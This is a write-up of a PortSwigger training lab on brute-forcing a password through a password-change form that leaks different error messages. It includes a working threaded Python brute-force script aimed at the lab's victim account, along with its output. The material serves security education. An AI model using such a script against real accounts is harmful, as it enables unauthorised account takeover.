# Password brute-force via password change

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change), you'll learn: Password brute-force via password change! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Exploitation

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222061644.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222061657.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222061706.png)

In here, we can change user's password.

**Let's try to update our password and intercept the request via Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222061804.png)

When we clicked the `Change password` button, it'll send a POST request to `/my-account/change-password`, with parameter **`username`, `current-password`**, `new-password-1`, and `new-password-2`.

Let's drop that request and test one thing.

**What if I entered an incorrect current password?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222062402.png)

If the current password is incorrect, it'll redirect me to `/login`.

Also, the change password function has a parameter called `username`.

**What if I change that parameter to `carlos`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222062541.png)

Still the same.

**Now, what if the current password and confirm new password are incorrect?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222063542.png)

It displays `Current password is incorrect`.

**Then what if the current password is correct, and confirm new password is incorrect?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222063736.png)

It displays `New passwords do not match`.

**Armed with above information, we can brute force `carlos`'s password via a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()

    with open(filename) as fd:
        for line in fd:
            listPassword.append(line.strip())

    return listPassword

def sendRequest(url, cookie, password):
    loginData = {
        'username': 'carlos',
        'current-password': password,
        'new-password-1': 'fakepassword',
        'new-password-2': 'fakefakepassword'
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'New passwords do not match' in loginRequestText:
        print(f'[+] Found password: {password}')

def main():
    url = 'https://0abf002404a8267cc24aa2710069002f.web-security-academy.net/my-account/change-password'
    cookie = {
        'session': 'vGQDEH6spu3GS37ZaaFrD05G1hdB1Vo1',
        'session': 'MTTOtDOjdJHZRfxAtEgbVh7LiiSnLcqJ'
    }

    passwordFileName = './auth_password.txt'
    listPassword = fetchPassword(passwordFileName)
    
    for password in listPassword:
        thread = Thread(target=sendRequest, args=(url, cookie, password))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_password_changepassword.py
[+] Found password: monkey
```

- Found `carlos`'s password: `monkey`

Let's login as user `carlos`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222064447.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-12/images/Pasted%20image%2020221222064455.png)

I'm user `carlos`!

# What we've learned:

1. Password brute-force via password change